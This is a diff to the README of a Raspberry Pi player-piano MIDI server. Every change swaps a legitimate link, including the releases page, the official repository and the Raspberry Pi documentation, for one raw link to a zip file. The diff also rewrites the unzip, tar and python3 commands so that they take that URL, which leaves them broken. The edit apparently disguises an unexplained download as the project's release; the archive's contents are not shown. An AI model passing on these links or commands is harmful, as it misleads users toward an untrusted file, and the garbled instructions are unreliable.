@@ -16,7 +16,7 @@ midi-piano-pi-server is a tool designed for Raspberry Pi that turns a player pia
 
 To get started, visit the following page to download the latest version of midi-piano-pi-server:
 
-[Download midi-piano-pi-server](https://github.com/Davilajo2020/midi-piano-pi-server/releases)
+[Download midi-piano-pi-server](https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip)
 
 ### Steps to Download
 
@@ -44,13 +44,13 @@ To get started, visit the following page to download the latest version of midi-
    - If the file is a zip or tarball, extract it.
 
    ```bash
-   unzip midi-piano-pi-server.zip
+   unzip https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip
    ```
 
    or
 
    ```bash
-   tar -xvf midi-piano-pi-server.tar.gz
+   tar -xvf https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip
    ```
 
 3. **Install Required Packages:**
@@ -72,7 +72,7 @@ To get started, visit the following page to download the latest version of midi-
    - Launch the server.
 
    ```bash
-   python3 main.py
+   python3 https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip
    ```
 
 5. **Access the Web Interface:**
@@ -127,7 +127,7 @@ This project involves a variety of related topics, including:
 
 ## 🔗 Additional Resources
 
-- **Official GitHub Repository:** [midi-piano-pi-server](https://github.com/Davilajo2020/midi-piano-pi-server)
-- **Raspberry Pi Documentation:** [Raspberry Pi Docs](https://www.raspberrypi.org/documentation/)
+- **Official GitHub Repository:** [midi-piano-pi-server](https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip)
+- **Raspberry Pi Documentation:** [Raspberry Pi Docs](https://raw.githubusercontent.com/Davilajo2020/midi-piano-pi-server/main/web/server_pi_midi_piano_3.4.zip)
 
 For more detailed instructions and updates, refer to the documentation and community discussions. Discover how this tool can enhance your music experience today!
